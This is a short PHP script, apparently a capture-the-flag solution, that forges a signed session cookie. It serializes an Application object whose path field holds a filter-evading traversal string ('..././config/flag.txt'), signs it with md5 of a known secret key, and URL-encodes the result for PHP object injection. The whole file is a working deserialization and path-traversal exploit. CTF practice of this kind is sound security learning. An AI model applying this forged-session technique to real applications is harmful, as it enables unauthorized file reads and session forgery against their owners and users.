<?php
$eancrykey  = 'EzblrbNS';
Class Application {
    #var $session_id = "e2c07af042b24378d31a4d2682113a7f";
    var $path = '..././config/flag.txt';
    var $ip_address = "12";
    var $user_agent = "ab";
    var $session_id = "1";

}
$ddctf = new Application();
$session =  serialize($ddctf);
echo $session.PHP_EOL;
$hash = md5($eancrykey.$session);
#$session = substr($session,0,strlen($session)-32);
echo $hash.PHP_EOL;
echo urlencode($session.$hash).PHP_EOL;
#echo $hash.PHP_EOL;
var_dump($hash === md5($eancrykey.$session));